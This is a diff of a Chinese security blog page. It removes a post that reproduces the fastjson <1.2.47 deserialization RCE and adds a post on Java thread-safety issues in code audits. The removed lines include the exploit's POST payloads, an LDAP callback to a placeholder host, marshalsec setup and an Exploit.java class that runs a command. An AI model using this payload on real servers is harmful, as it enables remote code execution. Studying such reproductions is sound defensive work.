@@ -63,21 +63,21 @@
       <div id="middlecontent" title class="global-width sidebar-right">
         <section id="main">
   
-    <article id="post-fastjson-1-2-47-RCE-漏洞复现" class="article global-container article-type-post" itemscope itemprop="blogPost">
+    <article id="post-深入剖析代审的线程安全问题" class="article global-container article-type-post" itemscope itemprop="blogPost">
   
     <header class="article-header">
       
   
     <h1 itemprop="name">
-      <a class="article-title" href="/2019/08/27/fastjson-1-2-47-RCE-漏洞复现/">fastjson&lt;1.2.47 RCE 漏洞复现</a>
+      <a class="article-title" href="/2020/01/12/深入剖析代审的线程安全问题/">深入剖析代审的线程安全问题</a>
     </h1>
   
 
     </header>
   
   <div class="article-meta">
-    <a href="/2019/08/27/fastjson-1-2-47-RCE-漏洞复现/" class="article-date">
-  <time datetime="2019-08-27T01:41:52.000Z" itemprop="datePublished">2019-08-27</time>
+    <a href="/2020/01/12/深入剖析代审的线程安全问题/" class="article-date">
+  <time datetime="2020-01-11T16:14:10.000Z" itemprop="datePublished">2020-01-12</time>
 </a>
     
     
@@ -88,18 +88,32 @@
     
     <div class="article-content article-content-cloud" itemprop="articleBody">
       
-        <p>author：test<br><strong>Ox01 具体环境</strong><br>War包部署在tomcat,war包使用fastjson解析库<br>tomcat版本<br><img src="https://i.loli.net/2019/08/27/2K7oDWtaXfJQLRZ.png" alt="图"><br>java版本<br><img src="https://i.loli.net/2019/08/27/sEuCnxq9ywDjoXc.png" alt="图"></p>
-<p><strong>0x02 尝试是否可以接受请求（也可以没有这一步）</strong><br>先尝试是否可以收到ldap请求<br>post数据包如下：</p>
-<div class="highlight-box"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">POST /fastjson/ HTTP/1.1</span><br><span class="line">Host: x.x.x.x:8080</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.100 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9,en;q=0.8</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 215</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">&quot;name&quot;:&#123;</span><br><span class="line">   &quot;@type&quot;:&quot;java.lang.Class&quot;,</span><br><span class="line">   &quot;val&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><br><span class="line">&#125;,</span><br><span class="line">&quot;f&quot;:&#123;      </span><br><span class="line">&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;ldap://x.x.x.x:8080/Exploit&quot;,&quot;autoCommit&quot;:true&#125;&#125;</span><br></pre></td></tr></table></figure></div>
+        <p><strong>作者：Runtest</strong><br>最近对JAVA代码安全的学习越来越感兴趣，今天就来聊一聊线程安全,想学习线程安全，就看看哪些情况不安全，写代码来验证那些比较抽象的东西来增加对代码的理解和学习。</p>
+<h3 id="0x01-非局部变量和方法参数"><a href="#0x01-非局部变量和方法参数" class="headerlink" title="0x01 非局部变量和方法参数"></a>0x01 非局部变量和方法参数</h3><p>方法传递的参数也相当于局部，局部变量在线程栈中存放，调用地址为随机地址，共享变量在方法区，堆空间<br>code</p>
+<div class="highlight-box"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">class Threadtypesec implements Runnable&#123;</span><br><span class="line">    private volatile int count = 5;</span><br><span class="line">    @Override</span><br><span class="line">    public  void run() &#123;</span><br><span class="line">//synchronized</span><br><span class="line">//        int count = 5;</span><br><span class="line">        count=count-1;</span><br><span class="line">        System.out.println(Thread.currentThread().getName()+&quot;当前值为&quot;+count);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
 
-<p>发送数据报：<br><img src="https://i.loli.net/2019/08/28/qSNUrFeazAE9D1O.png" alt="D518D79A-05ED-4BCF-9B43-1F208FAEB7B7.png"><br>服务端接口请求：<br><img src="https://i.loli.net/2019/08/28/nXfgcxB52t1zWGs.png" alt="图"></p>
-<p><strong>Ox03 构造数据包以及工具</strong><br>1 用到的工具： <a href="https://github.com/mbechler/marshalsec" target="_blank" rel="noopener">https://github.com/mbechler/marshalsec</a><br>2 使用maven打包，具体为cd到目录然后 mvn clean package -DskipTests<br>3 构造数据包<br>post数据包如下：</p>
-<div class="highlight-box"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">POST /fastjson/ HTTP/1.1</span><br><span class="line">Host: 10.x.x.x:8080</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.100 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9,en;q=0.8</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 215</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">&quot;name&quot;:&#123;</span><br><span class="line">   &quot;@type&quot;:&quot;java.lang.Class&quot;,</span><br><span class="line">   &quot;val&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><br><span class="line">&#125;,</span><br><span class="line">&quot;f&quot;:&#123;      </span><br><span class="line">&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;ldap://10.x.x.x:1389/Exploit&quot;,&quot;autoCommit&quot;:true&#125;&#125;</span><br></pre></td></tr></table></figure></div>
+<p>创建多个线程，执行run方法。</p>
+<div class="highlight-box"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">Runnable runnable = new Threadtypesec();</span><br><span class="line">Thread[] threads1 = new Thread[5];</span><br><span class="line">for (int i = 0; i &lt; 5; i++) &#123;</span><br><span class="line">    threads1[i] = new Thread(runnable,&quot;当前线程&quot;+(i+1));</span><br><span class="line">&#125;</span><br><span class="line">for(Thread thread1 : threads1) &#123;</span><br><span class="line">    thread1.start();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
 
-<p>4 构造的恶意java类，需要javac编译成class文件，存放于http服务器，ldap服务指向于http服务<br>代码命名为：Exploit.java</p>
-<div class="highlight-box"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">public class Exploit &#123;</span><br><span class="line">    public Exploit()&#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            Runtime.getRuntime ().exec ( &quot;calc&quot; );</span><br><span class="line">        &#125;catch (Exception e)&#123;</span><br><span class="line">            e.printStackTrace ();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        Exploit e=new Exploit ();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+<p>运行结果如下，多线程操作类里面的公共变量导致操作值未能及时更新减一，猜测那些条件竞争漏洞也是基础此类的原理</p>
+<div class="highlight-box"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">当前线程2当前值为3</span><br><span class="line">当前线程3当前值为2</span><br><span class="line">当前线程1当前值为3</span><br><span class="line">当前线程5当前值为0</span><br><span class="line">当前线程4当前值为1</span><br></pre></td></tr></table></figure></div>
 
-<p>编译此java文件<br><img src="https://i.loli.net/2019/08/28/zCHtumkTcDaywFr.png" alt="图"><br><strong>0x04 启动服务，验证是否 可以执行命令</strong><br>启动各类服务<br><img src="https://i.loli.net/2019/08/28/jPMmU4wk2dvY6VS.png" alt="36602945-99DE-4243-87EB-E23C58457AF8.png"><br>发送数据包<br><img src="https://i.loli.net/2019/08/28/ul5kdwaSCtj8Ghr.png" alt="test.png"><br>执行成功<br><img src="https://i.loli.net/2019/08/28/rlUNhKzpy72SsQa.png" alt="9C7899A6-2E6A-42CB-94E0-D9F82C37416A.png"></p>
+<h3 id="0x02-安全的写法"><a href="#0x02-安全的写法" class="headerlink" title="0x02 安全的写法"></a>0x02 安全的写法</h3><p>实现安全的方法不止一种</p>
+<div class="highlight-box"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">class Threadtypesec implements Runnable&#123;</span><br><span class="line">    private volatile int count = 5;</span><br><span class="line">    @Override</span><br><span class="line">    public synchronized void run() &#123;</span><br><span class="line">//synchronized</span><br><span class="line">//        int count = 5;</span><br><span class="line">        count=count-1;</span><br><span class="line">        System.out.println(Thread.currentThread().getName()+&quot;当前值为&quot;+count);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>用synchronized修饰方法，即为同步的方法或者和区，多线程执行同一方法下，单个线程会先获取方法区的锁，执行完后释放锁，整个过程属于JVM管理，这里要区别synchronized和ReentrantLock的实现原理，略有不同，参考：<a href="https://www.cnblogs.com/revel171226/p/9411131.html" target="_blank" rel="noopener">https://www.cnblogs.com/revel171226/p/9411131.html</a></p>
+<h3 id="0x03-单例模式下线程安全"><a href="#0x03-单例模式下线程安全" class="headerlink" title="0x03 单例模式下线程安全"></a>0x03 单例模式下线程安全</h3><p>参考：<a href="https://www.jianshu.com/p/3bfd916f2bb2" target="_blank" rel="noopener">https://www.jianshu.com/p/3bfd916f2bb2</a><br>不安全的写法：</p>
+<div class="highlight-box"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">public class Singlesec &#123;</span><br><span class="line">    private static Singlesec instance;</span><br><span class="line">    private Singlesec ()&#123;&#125;</span><br><span class="line"></span><br><span class="line">    public static Singlesec getSinglesec() &#123;</span><br><span class="line">        if (instance == null) &#123;</span><br><span class="line">            instance = new Singlesec();</span><br><span class="line">        &#125;</span><br><span class="line">        return instance;</span><br><span class="line">    &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure></div>
+
+<p><img src="https://i.loli.net/2020/01/12/xBbWti1Rquo9Vg7.png" alt="图片.png"><br>单例模式：在程序运行过程中保证仅有一个对象被创建，以下代码进行了是双重校验，volatile变量保证了singleton的内存可见性以及防止指令重排序，synchronized原语确保创建安全</p>
+<div class="highlight-box"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">public class Singlesec &#123;</span><br><span class="line">    private volatile static Singlesec instance;</span><br><span class="line">    private Singlesec ()&#123;&#125;</span><br><span class="line">    public static Singlesec getSinglesec() &#123;</span><br><span class="line">        if (instance == null) &#123;</span><br><span class="line">            synchronized (Singlesec.class) &#123;</span><br><span class="line">                if (instance == null) &#123;</span><br><span class="line">                    instance = new Singlesec();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        return instance;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>验证<br><img src="https://i.loli.net/2020/01/11/cTXs7aKzyAW5LZj.png" alt="图片.png"><br>使用下面这种方法，在类被加载的时候创建实例,所以线程是安全的</p>
+<div class="highlight-box"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">public class Singlesec &#123;</span><br><span class="line">    private static Singlesec instance = new Singlesec();</span><br><span class="line">    private Singlesec ()&#123;&#125;</span><br><span class="line">    public static Singlesec getInstance() &#123;</span><br><span class="line">        return instance;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></div>
+
+<p><img src="https://i.loli.net/2020/01/12/pLQehDk1VzvsgAH.png" alt="图片.png"><br>至于构造方法为什么被私有化，是为了防止其他class创建<br><img src="https://i.loli.net/2020/01/11/m75KSwjzI9MQlXD.png" alt="图片.png"></p>
+<h3 id="0x04-Spring中单例模式安全问题"><a href="#0x04-Spring中单例模式安全问题" class="headerlink" title="0x04 Spring中单例模式安全问题"></a>0x04 Spring中单例模式安全问题</h3><p>为什么要说spring系列的框架呢，因为平时遇到最多的代码使用的基本都是Spring系列的，spring中线程安全性依赖于ThreadLocal，ThreadLocal可以理解为synchronized类似的基于JVM实现的线程安全函数，只不过ThreadLocal实现类似于hashmap。<br>强力推荐读这篇文章<a href="https://www.jianshu.com/p/e200e96a41a0" target="_blank" rel="noopener">https://www.jianshu.com/p/e200e96a41a0</a></p>
+<h3 id="夜深了，晚安"><a href="#夜深了，晚安" class="headerlink" title="夜深了，晚安"></a>夜深了，晚安</h3><p>夜已深，改天详细写Spring中一些列的场景的安全问题。</p>
 
       
     </div>
@@ -114,7 +128,7 @@
 
   <nav id="page-nav">
     
-    <a class="extend prev" rel="prev" href="/">&laquo; Prev</a><a class="page-number" href="/">1</a><span class="page-number current">2</span>
+    <a class="extend prev" rel="prev" href="/">&laquo; Prev</a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><a class="page-number" href="/page/4/">4</a><span class="space">&hellip;</span><a class="page-number" href="/page/11/">11</a><a class="extend next" rel="next" href="/page/3/">Next &raquo;</a>
   </nav>
 
 
